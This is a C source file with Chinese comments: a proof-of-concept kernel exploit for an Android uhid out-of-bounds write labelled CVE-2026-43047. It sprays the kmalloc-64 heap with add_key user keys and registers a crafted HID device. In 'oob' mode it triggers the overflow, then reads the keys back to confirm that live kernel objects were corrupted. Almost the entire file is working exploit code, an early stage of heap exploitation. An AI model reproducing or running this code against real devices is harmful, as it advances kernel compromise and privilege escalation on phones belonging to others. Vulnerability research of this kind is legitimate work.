/* uhid_keyspray.c — CVE-2026-43047 + add_key 堆喷射               §DH
 *
 * msg_msg 不可用(Android 无 SysV IPC)，改用 add_key() 喷射 kmalloc-64。
 * user_key_payload: {rcu.next@0, rcu.func@8, datalen@16, data@18}
 * add_key("user", desc, payload, 40, ring) → kmalloc(18+40=58) → kmalloc-64 ✓
 *
 * 流程:
 *   ① add_key × 200 喷射 kmalloc-64（载荷填 0x41）
 *   ② 创建 uhid 设备(WPTP 描述符, FEATURE 报告 28B → kmalloc-64)
 *   ③ 回复 GET_REPORT(data[0]=1) 触发 memset 越界写
 *   ④ keyctl_read 读回每个 key 的载荷 —— 如果 0x41 变成了 0x00 ⇒ OOB 命中了活对象!
 */
#define __BIONIC_DEPRECATED_PAGE_SIZE_MACRO
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <dirent.h>
#include <sys/syscall.h>
#include <sys/select.h>
#include <sys/time.h>

/* ---- syscall wrappers(Bionic 可能没有这些包装) ---- */
#ifndef __NR_add_key
#define __NR_add_key 218
#endif
#ifndef __NR_keyctl
#define __NR_keyctl 219
#endif

#define KEY_SPEC_PROCESS_KEYRING (-2)
#define KEYCTL_READ 11

static long sys_add_key(const char *type, const char *desc, const void *payload, int plen, int ring) {
    return syscall(__NR_add_key, type, desc, payload, (size_t)plen, ring);
}
static long sys_keyctl_read(int key, void *buf, size_t len) {
    return syscall(__NR_keyctl, KEYCTL_READ, key, buf, len);
}

#define EVSZ 4380
#define BIG_REPORT_ID 1
#define T_FEATURE_ANSWER 10
#define NSPRAY 200
#define PAYLOAD_LEN 40

static unsigned char ev[EVSZ];
static int g_oob = 0;
static int g_get_seen = 0;
static int g_reply_ok = 0;

static void wr32(int o, uint32_t v) { memcpy(ev + o, &v, 4); }
static void wr16(int o, uint16_t v) { memcpy(ev + o, &v, 2); }
static uint32_t rd32(int o) { uint32_t v; memcpy(&v, ev + o, 4); return v; }

/* ---- WPTP 描述符 + FEATURE 报告 28B → kmalloc-64 ---- */
static unsigned char desc[4096];
static int desc_len;
static void build_desc(void) {
    int n = 0;
    unsigned char parts[] = {
        0x05,0x0D, 0x09,0x05, 0xA1,0x01,
        0x85,0x01,
        0x09,0x56, 0x24,0x00, 0x26,0xFF,0xFF, 0x75,0x10, 0x95,0x01, 0x81,0x02,
        0x09,0x54, 0x25,0x05, 0x75,0x08, 0x81,0x02,
        0x05,0x0D, 0x09,0x22, 0xA1,0x02,
            0x09,0x51, 0x25,0x0F, 0x75,0x04, 0x95,0x01, 0x81,0x02,
            0x09,0x42, 0x25,0x01, 0x75,0x01, 0x81,0x02,
            0x09,0x47, 0x81,0x02, 0x95,0x05, 0x81,0x03,
            0x05,0x01, 0x09,0x30, 0x15,0x00, 0x26,0xC8,0x00, 0x35,0x00,
            0x45,0x69, 0x65,0x11, 0x75,0x10, 0x95,0x01, 0x81,0x02,
            0x09,0x31, 0x26,0x96,0x00, 0x45,0x4B, 0x81,0x02,
        0xC0,
        0x05,0x09, 0x09,0x01, 0x15,0x00, 0x25,0x01, 0x75,0x01, 0x95,0x01,
        0x81,0x02, 0x95,0x07, 0x81,0x03,
        0x85,0x02,
        0x05,0x0D, 0x09,0x55, 0x25,0x05, 0x75,0x08, 0x95,0x01, 0xB1,0x02,
        0x09,0x59, 0x25,0x02, 0xB1,0x02,
        0x09,0xB0, 0x75,0x08, 0x95,0x18, 0xB1,0x02,
    };
    memcpy(desc, parts, sizeof(parts));
    desc_len = sizeof(parts);
}

static void show_binding(void) {
    DIR *d = opendir("/sys/bus/hid/devices");
    if (!d) return;
    struct dirent *de;
    while ((de = readdir(d))) {
        if (de->d_name[0]=='.') continue;
        char path[512], link[512];
        snprintf(path, sizeof(path), "/sys/bus/hid/devices/%s/driver", de->d_name);
        ssize_t n = readlink(path, link, sizeof(link)-1);
        if (n<0) n=0; link[n]=0;
        const char *drv = strrchr(link,'/'); drv = drv ? drv+1 : link;
        printf("  %s → %s\n", de->d_name, n>0 ? drv : "(未绑定)");
    }
    closedir(d);
}

int main(int argc, char **argv) {
    setvbuf(stdout, NULL, _IONBF, 0);
    g_oob = (argc > 1 && strcmp(argv[1], "oob") == 0);
    printf("=== uhid_keyspray: CVE-2026-43047 + add_key 堆喷射 ===\n");
    printf("模式: %s\n", g_oob ? "oob(触发)" : "safe(只验证)");

    /* 步骤 1: add_key 可用性测试 */
    printf("\n[1] add_key 可用性测试...\n");
    unsigned char test_payload[PAYLOAD_LEN];
    memset(test_payload, 0x41, PAYLOAD_LEN);
    errno = 0;
    long test_key = sys_add_key("user", "test_0", test_payload, PAYLOAD_LEN, KEY_SPEC_PROCESS_KEYRING);
    printf("  add_key test → key=%ld errno=%d\n", test_key, errno);
    if (test_key < 0) {
        printf("  add_key 不可用(可能被 SELinux 阻止)\n");
        printf("  尝试 key_syscall: %d\n", __NR_add_key);
        return 1;
    }
    /* 读回来验证 */
    unsigned char readback[PAYLOAD_LEN + 8];
    memset(readback, 0, sizeof(readback));
    long rl = sys_keyctl_read((int)test_key, readback, sizeof(readback));
    printf("  keyctl_read → %ld bytes, payload[0..3]=%02x %02x %02x %02x\n",
           rl, readback[0], readback[1], readback[2], readback[3]);

    /* 步骤 2: 堆喷射 */
    printf("\n[2] add_key 喷射 %d 个 key (payload=%dB → kmalloc-64)...\n", NSPRAY, PAYLOAD_LEN);
    int keys[NSPRAY];
    int sprayed = 0;
    memset(test_payload, 0x41, PAYLOAD_LEN);
    for (int i = 0; i < NSPRAY; i++) {
        char dname[32];
        snprintf(dname, sizeof(dname), "spray_%d", i);
        keys[i] = (int)sys_add_key("user", dname, test_payload, PAYLOAD_LEN, KEY_SPEC_PROCESS_KEYRING);
        if (keys[i] >= 0) sprayed++;
        else if (i < 3) printf("  key %d 失败 errno=%d\n", i, errno);
    }
    printf("  喷射: %d/%d 成功\n", sprayed, NSPRAY);

    /* 步骤 3: 创建 uhid 设备 */
    printf("\n[3] 创建 uhid 设备...\n");
    build_desc();
    int fd = open("/dev/uhid", O_RDWR | O_CLOEXEC);
    if (fd < 0) { printf("open 失败 errno=%d\n", errno); return 1; }
    memset(ev, 0, EVSZ);
    wr32(0, 0);
    strncpy((char*)(ev+4), "uhid_keysp", 127);
    uint64_t p = (uint64_t)(uintptr_t)desc;
    memcpy(ev+260, &p, 8);
    wr16(268, (uint16_t)desc_len);
    wr16(270, 0x0003);
    wr32(272, 0x1234); wr32(276, 0x5678); wr32(280, 1);
    errno = 0;
    ssize_t w = write(fd, ev, EVSZ);
    printf("  CREATE → ret=%zd errno=%d\n", w, errno);

    /* 步骤 4: 事件循环 */
    printf("\n[4] 事件循环...\n");
    struct timeval t0; gettimeofday(&t0, NULL);
    for (;;) {
        struct timeval now; gettimeofday(&now, NULL);
        if (now.tv_sec - t0.tv_sec > 10) { printf("  [超时]\n"); break; }
        struct timeval tv = {1, 0};
        fd_set rf; FD_ZERO(&rf); FD_SET(fd, &rf);
        if (select(fd+1, &rf, NULL, NULL, &tv) <= 0) continue;
        ssize_t r = read(fd, ev, EVSZ);
        if (r <= 0) continue;
        uint32_t type = rd32(0);
        if (type == 2) { printf("  <START>\n"); continue; }
        if (type == 4) { printf("  <OPEN>\n"); continue; }
        if (type != 9) { printf("  <type=%u>\n", type); continue; }

        uint32_t id = rd32(4);
        printf("  ★ GET_REPORT: id=%u rnum=%02x rtype=%02x\n", id, ev[8], ev[9]);
        g_get_seen = 1;

        memset(ev, 0, EVSZ);
        wr32(0, T_FEATURE_ANSWER);
        wr32(4, id);
        wr16(8, 0);
        wr16(10, 3);
        ev[12] = g_oob ? BIG_REPORT_ID : 0;
        ev[13] = 0x42; ev[14] = 0x43;
        errno = 0;
        ssize_t rw = write(fd, ev, EVSZ);
        g_reply_ok = (rw > 0);
        printf("  回复(type=10 data[0]=%02x) → ret=%zd errno=%d %s\n",
               ev[12], rw, errno, g_reply_ok ? "✓" : "✗");
        if (g_oob) { sleep(3); break; }
    }

    /* 步骤 5: 读回所有 key 检查是否被越界写修改 */
    printf("\n[5] 检查 key 载荷是否被 OOB 修改...\n");
    int zeroed = 0, corrupted = 0, ok = 0;
    for (int i = 0; i < sprayed; i++) {
        if (keys[i] < 0) continue;
        memset(readback, 0, sizeof(readback));
        rl = sys_keyctl_read(keys[i], readback, sizeof(readback));
        if (rl <= 0) { zeroed++; continue; }
        int has_zero = 0;
        for (int j = 0; j < PAYLOAD_LEN && j < (int)rl; j++) {
            if (readback[j] != 0x41) { has_zero = 1; break; }
        }
        if (has_zero) corrupted++;
        else ok++;
    }
    printf("  结果: 完好=%d 被清零=%d 读失败=%d (总 %d)\n", ok, corrupted, zeroed, ok+corrupted+zeroed);
    if (corrupted > 0 || zeroed > 0)
        printf("  ★★★ OOB 写确认命中了 add_key 喷射的活对象!\n");
    else
        printf("  (未被修改 — 越界写可能未到达 key 对象所在的内存区域)\n");

    printf("\n绑定状态:\n");
    show_binding();

    printf("\n=== 结束, 进程存活 ===\n");
    close(fd);
    return 0;
}
